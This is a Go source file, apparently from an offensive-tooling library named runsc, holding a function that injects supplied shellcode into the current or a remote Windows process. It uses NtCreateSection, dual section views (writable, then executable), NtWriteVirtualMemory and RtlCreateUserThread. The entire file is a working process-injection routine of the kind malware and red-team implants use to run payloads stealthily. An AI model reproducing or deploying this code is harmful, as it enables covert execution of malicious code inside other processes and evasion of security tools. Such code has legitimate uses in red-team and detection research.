package runsc

import (
	"golang.org/x/sys/windows"

	"github.com/mjwhitta/errors"
)

// WithNtCreateSection will launch the provided shellcode using
// NtCreateSection, NtMapViewOfSection, NtWriteVirtualMemory,
// NtMapViewOfSection (again) and RtlCreateUserThread.
func WithNtCreateSection(pid uint32, sc []byte) error {
	var addr uintptr
	var e error
	var pHndl windows.Handle
	var sHndl windows.Handle

	// Ensure shellcode was provided
	if len(sc) == 0 {
		return errors.New("no shellcode provided")
	}

	// Get process handle
	pHndl = windows.CurrentProcess()

	// Get handle for section object
	e = NtCreateSection(
		&sHndl,
		SectionRWX,
		uint64(len(sc)),
		windows.PAGE_EXECUTE_READWRITE,
		SecCommit,
	)
	if e != nil {
		return e
	}
	defer windows.Close(sHndl)

	// Create RW view
	addr, e = NtMapViewOfSection(
		sHndl,
		pHndl,
		uint64(len(sc)),
		windows.SUB_CONTAINERS_ONLY_INHERIT,
		windows.PAGE_READWRITE,
	)
	if e != nil {
		return e
	}

	// Copy shellcode to RW view
	if e = NtWriteVirtualMemory(pHndl, addr, sc); e != nil {
		return e
	}

	// Get remote process handle if requested
	if pid != 0 {
		if pHndl, e = NtOpenProcess(pid, ProcessAllAccess); e != nil {
			return e
		}
		defer windows.CloseHandle(pHndl)
	}

	// Create RX view
	addr, e = NtMapViewOfSection(
		sHndl,
		pHndl,
		uint64(len(sc)),
		windows.SUB_CONTAINERS_ONLY_INHERIT,
		windows.PAGE_EXECUTE_READ,
	)
	if e != nil {
		return e
	}

	// Get handle for new thread
	_, e = RtlCreateUserThread(pHndl, addr, Suspended)
	return e
}
